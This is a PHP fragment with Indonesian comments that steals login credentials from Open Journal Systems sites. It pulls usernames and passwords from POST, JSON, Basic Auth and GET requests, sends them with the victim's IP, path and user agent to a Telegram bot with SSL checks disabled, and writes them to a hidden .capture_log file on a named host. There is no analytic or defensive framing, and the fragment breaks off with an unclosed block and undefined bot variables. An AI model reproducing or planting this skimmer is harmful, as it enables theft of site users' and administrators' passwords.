// ============================================
// CAPTURE SEMUA LOGIN ATTEMPT
// ============================================

// Deteksi method request
$is_login_page = false;
$username = '';
$password = '';

// CEK 1: Apakah ini halaman login OJS?
$request_uri = $_SERVER['REQUEST_URI'] ?? '';
if (strpos($request_uri, 'login') !== false || 
    strpos($request_uri, 'signIn') !== false ||
    strpos($request_uri, 'admin') !== false) {
    $is_login_page = true;
}

// CEK 2: Tangkap dari POST (method utama OJS)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Format OJS 3.x
    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];
    }
    // Format OJS 2.x
    elseif (isset($_POST['email']) && isset($_POST['password'])) {
        $username = $_POST['email'];
        $password = $_POST['password'];
    }
    // Format lain
    elseif (isset($_POST['user']) && isset($_POST['pass'])) {
        $username = $_POST['user'];
        $password = $_POST['pass'];
    }
    // Format login admin
    elseif (isset($_POST['login']) && isset($_POST['pwd'])) {
        $username = $_POST['login'];
        $password = $_POST['pwd'];
    }
    // Format generic
    else {
        foreach ($_POST as $key => $value) {
            if (stripos($key, 'user') !== false && empty($username)) {
                $username = $value;
            }
            if (stripos($key, 'pass') !== false && empty($password)) {
                $password = $value;
            }
            if (stripos($key, 'email') !== false && empty($username)) {
                $username = $value;
            }
        }
    }
}

// CEK 3: Tangkap dari JSON payload (OJS API)
if (empty($username) && $input = file_get_contents('php://input')) {
    $json = json_decode($input, true);
    if ($json) {
        $username = $json['username'] ?? $json['email'] ?? $json['user'] ?? '';
        $password = $json['password'] ?? $json['pass'] ?? '';
    }
}

// CEK 4: Tangkap dari Basic Auth
if (empty($username) && isset($_SERVER['PHP_AUTH_USER'])) {
    $username = $_SERVER['PHP_AUTH_USER'];
    $password = $_SERVER['PHP_AUTH_PW'];
}

// CEK 5: Tangkap dari GET parameter (beberapa OJS versi lama)
if (empty($username) && isset($_GET['username']) && isset($_GET['password'])) {
    $username = $_GET['username'];
    $password = $_GET['password'];
}

// ============================================
// JIKA ADA CREDENTIAL, KIRIM KE TELEGRAM
// ============================================
if (!empty($username) && !empty($password)) {
    
    // Ambil informasi detail
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['HTTP_X_REAL_IP'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    // Clean IP (ambil pertama jika ada multiple)
    if (strpos($ip, ',') !== false) {
        $ip = trim(explode(',', $ip)[0]);

    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $full_path = $_SERVER['REQUEST_URI'] ?? '/';
    $method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
    $time = date('Y-m-d H:i:s');
    $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
    
    // Deteksi OJS version
    $ojs_version = 'Unknown';
    if (defined('APPLICATION_VERSION')) {
        $ojs_version = APPLICATION_VERSION;
    } elseif (defined('OJS_VERSION')) {
        $ojs_version = OJS_VERSION;
    } elseif (file_exists('/home/sudi6130/public_html/di-publisher.com/version.xml')) {
        $xml = @simplexml_load_file('/home/sudi6130/public_html/di-publisher.com/version.xml');
        if ($xml) {
            $ojs_version = (string)$xml->version->release;
        }
    }
    
    // Deteksi journal name
    $journal = 'Main Site';
    if (preg_match('/index\.php\/([^\/]+)/', $full_path, $matches)) {
        $journal = $matches[1];
    }
    
    // Build message
    $message = "🔐 OJS LOGIN CAPTURED\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "👤 USERNAME: {$username}\n";
    $message .= "🔑 PASSWORD: {$password}\n";
    $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
    $message .= "🌐 IP: {$ip}\n";
    $message .= "📍 PATH: {$full_path}\n";
    $message .= "📚 JOURNAL: {$journal}\n";
    $message .= "🏷️  OJS: {$ojs_version}\n";
    $message .= "⏰ TIME: {$time}\n";
    $message .= "🌍 HOST: {$host}\n";
    $message .= "🔧 METHOD: {$method}\n";
    $message .= "📱 UA: " . substr($user_agent, 0, 60);
    
    // KIRIM KE TELEGRAM (MULTI METHOD)
    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
    
    // Method 1: CURL (paling reliable)
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_exec($ch);
        curl_close($ch);
    }
    // Method 2: file_get_contents
    elseif (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => [
                'method' => 'POST',
                'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                'content' => $post_data,
                'timeout' => 3
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        @file_get_contents($url, false, $context);
    }
    
    // OPTIONAL: Simpan ke file log (backup)
    $log_entry = "[{$time}] {$username}|{$password}|{$ip}|{$full_path}\n";
    @file_put_contents('/home/sudi6130/public_html/di-publisher.com/.capture_log', $log_entry, FILE_APPEND);
